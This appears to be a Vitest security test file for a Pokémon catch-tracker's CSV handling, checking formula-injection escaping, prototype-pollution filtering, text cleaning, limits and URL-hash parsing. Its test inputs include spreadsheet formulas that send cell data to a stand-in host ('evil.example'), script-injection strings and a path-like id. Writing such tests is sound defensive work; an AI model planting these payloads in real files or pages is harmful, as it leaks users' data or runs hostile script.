import { describe, expect, it } from 'vitest';
import {
  cleanText, escapeCell, ImportError, LIMITS, makeResolver, normalizeCatches, normalizeGoals, normalizeNotes,
  parseCount, parseCsv, parseDateTime, toCsv, unescapeCell,
} from './csv';
import { parseHash } from './router';
import { CATCH_COLUMNS } from './types';

const resolve = makeResolver(['Aron', 'Litwick', 'Chandelure']);
const blank = () => Object.fromEntries(CATCH_COLUMNS.map((c) => [c, ''])) as Record<string, string>;

describe('spreadsheet formula injection', () => {
  const payloads = [
    '=HYPERLINK("https://evil.example/?"&A1,"click")',
    '=IMPORTXML("https://evil.example","//a")',
    '+1+1', '-2+3', '@SUM(A1:A2)', '\t=1+1', '\r=1+1',
  ];

  it.each(payloads)('export makes %j inert', (p) => {
    const row = { ...blank(), id: 's001', species: 'Aron', ball: p, location: p };
    const csv = toCsv([row], CATCH_COLUMNS);
    const line = csv.split('\n')[1];
    // No cell in the exported line may begin with a formula character.
    for (const cell of line.match(/("([^"]|"")*"|[^,]*)/g)!.filter((c) => c.length)) {
      const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
      expect(unquoted).not.toMatch(/^[=+\-@\t\r]/);
    }
  });

  it('round-trips through export and import unchanged', () => {
    const row = { ...blank(), id: 's001', species: 'Aron', caught_at: '2026-09-23 21:04', location: '=1+1 and "quotes", commas' };
    const back = normalizeCatches(parseCsv(toCsv([row], CATCH_COLUMNS)).rows, resolve);
    expect(back.rows[0].location).toBe(row.location);
  });

  it('leaves ordinary text and numbers alone', () => {
    expect(escapeCell('Easy work.')).toBe('Easy work.');
    expect(escapeCell('2000000')).toBe('2000000');
    expect(unescapeCell("'=x")).toBe('=x');
    expect(unescapeCell("'tis")).toBe("'tis");
  });
});

describe('CSV parsing limits', () => {
  it('refuses files over the size limit', () => {
    expect(() => parseCsv('species\n' + 'a'.repeat(LIMITS.fileBytes))).toThrow(ImportError);
  });

  it('reads at most the row limit', () => {
    const text = 'species,caught_at\n' + Array.from({ length: LIMITS.rows + 50 }, () => 'Aron,2026-09-23').join('\n');
    const r = normalizeCatches(parseCsv(text).rows, resolve);
    expect(r.rows.length).toBeLessThanOrEqual(LIMITS.rows);
  });

  it('caps field lengths and says so', () => {
    const n = normalizeNotes([{ species: 'Aron', notes: 'x'.repeat(LIMITS.longText + 10) }], resolve);
    expect([...n.rows[0].notes]).toHaveLength(LIMITS.longText);
    const r = normalizeCatches([{ species: 'Aron', caught_at: '2026-09-23', location: 'y'.repeat(500) }], resolve);
    expect(r.rows[0].location.length).toBe(LIMITS.shortText);
    expect(r.issues.join(' ')).toMatch(/cut short/);
  });
});

describe('prototype pollution', () => {
  it('ignores __proto__, constructor and other unsafe headers', () => {
    const text = 'species,__proto__,constructor,prototype,Bad Header!,caught_at\nAron,{"polluted":1},x,y,z,2026-09-23\n';
    const parsed = parseCsv(text);
    expect(parsed.fields).toEqual(['species', 'caught_at']);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    const r = normalizeCatches(parsed.rows, resolve);
    expect(r.rows[0].species).toBe('Aron');
  });

  it('ignores inherited properties on input rows', () => {
    const evil = Object.create({ location: 'inherited' });
    evil.species = 'Aron';
    evil.caught_at = '2026-09-23';
    expect(normalizeCatches([evil], resolve).rows[0].location).toBe('');
  });
});

describe('text cleaning', () => {
  it('strips control, zero-width and bidi-override characters', () => {
    const { text } = cleanText('A\u0000r​o‮n⁦!\u0007', 100);
    expect(text).toBe('Aron!');
  });
  it('keeps line breaks only where they belong', () => {
    expect(cleanText('one\r\ntwo', 100, true).text).toBe('one\ntwo');
    expect(cleanText('one\r\ntwo', 100, false).text).toBe('one two');
  });
  it('treats HTML as plain text (React escapes it on screen)', () => {
    const r = normalizeCatches([{ species: '<img src=x onerror=alert(1)>', caught_at: '2026-09-23', location: '<script>alert(1)</script>' }], resolve);
    expect(r.rows[0].location).toBe('<script>alert(1)</script>');
    expect(r.issues.join(' ')).toMatch(/isn't a Pokémon name/);
  });
});

describe('numbers and dates', () => {
  it('rejects absurd numbers', () => {
    expect(parseCount('99999999999')).toBeNull();
    expect(parseCount('1000000001')).toBeNull();
    expect(parseCount('1e9')).toBeNull();
  });

  it('rejects odds below 2 so luck can never divide by zero', () => {
    const r = normalizeCatches([{ species: 'Aron', caught_at: '2026-09-23', odds: '0' }, { species: 'Aron', caught_at: '2026-09-24', odds: '1' }], resolve);
    expect(r.rows.map((x) => x.odds)).toEqual(['', '']);
  });

  it.each(['2026-02-30', '2026-02-29', '1999-01-01', '2101-01-01', '10/17/26, 13:14 PM', '2026-10-17 24:00'])('rejects %s', (s) =>
    expect(parseDateTime(s)).toBeNull());
  it('accepts a real leap day', () => expect(parseDateTime('2028-02-29')).toBe('2028-02-29'));
});

describe('field validation', () => {
  it('only keeps known methods, seasons and natures', () => {
    const r = normalizeCatches([{ species: 'Aron', caught_at: '2026-09-23', method: 'hacked', season: 'Monsoon', nature: 'Evil' }], resolve);
    expect(r.rows[0]).toMatchObject({ method: 'other', season: '', nature: '' });
    expect(r.issues).toHaveLength(3);
  });
  it('normalizes the case of valid values', () => {
    const r = normalizeCatches([{ species: 'aron', caught_at: '2026-09-23', method: '5X HORDE', season: 'spring', nature: 'adamant' }], resolve);
    expect(r.rows[0]).toMatchObject({ species: 'Aron', method: '5x horde', season: 'Spring', nature: 'Adamant' });
  });
  it('replaces ids with unexpected characters', () => {
    const r = normalizeCatches([{ id: '../../etc', species: 'Aron', caught_at: '2026-09-23' }, { id: 'x'.repeat(50), species: 'Aron', caught_at: '2026-09-23' }], resolve);
    expect(r.rows.map((x) => x.id)).toEqual(['s001', 's002']);
  });
});

describe('tampered browser storage', () => {
  it('skips rows that are not objects', () => {
    const junk = [null, 5, 'x', ['a'], { species: 'Aron', caught_at: '2026-09-23' }] as unknown as Record<string, unknown>[];
    expect(normalizeCatches(junk, resolve).rows.map((r) => r.species)).toEqual(['Aron']);
    expect(normalizeGoals(junk, resolve).rows.map((r) => r.species)).toEqual(['Aron']);
    expect(normalizeNotes(junk, resolve).rows).toEqual([]);
  });
  it('coerces non-string values', () => {
    const r = normalizeCatches([{ species: 'Aron', caught_at: '2026-09-23', encounters: 26321 as unknown as string, location: { a: 1 } as unknown as string }], resolve);
    expect(r.rows[0].encounters).toBe('26321');
    expect(r.rows[0].location).toBe('[object Object]');
  });
});

describe('URL hash', () => {
  it('never throws on malformed input', () => {
    for (const h of ['#/catch/%E0%A4%A', '#/p/abc', '#/p/99999', '#/p/1e3', `#/${'x'.repeat(5000)}`, '#/catch/%']) {
      expect(() => parseHash(h)).not.toThrow();
    }
  });
  it('only accepts dex numbers for species pages', () => {
    expect(parseHash('#/p/607')).toEqual({ page: 'species', id: 607 });
    expect(parseHash('#/p/607abc')).toEqual({ page: 'dex' });
    expect(parseHash('#/p/-1')).toEqual({ page: 'dex' });
  });
  it('caps lengths from the URL', () => {
    const r = parseHash(`#/catch/${'a'.repeat(100)}`);
    expect(r.page === 'catch-edit' && r.id.length).toBe(20);
  });
});
